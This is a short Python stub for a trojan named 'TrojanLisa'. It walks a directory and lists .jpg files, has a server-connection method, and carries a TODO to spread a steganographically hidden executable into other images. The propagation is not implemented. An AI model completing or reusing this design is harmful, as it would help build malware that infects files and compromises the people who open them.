import os
import client

class TrojanLisa:
    def __init__(self):
        self.client = client.Client()

    # TODO: Steganographic executable propagation into other images
    def propagate(self):
        rootdir = "." + os.sep
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                filepath = subdir + os.sep + file

                if filepath.endswith(".jpg"):
                    print(filepath)

    def connect_to_server(self):
        self.client.connect()
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()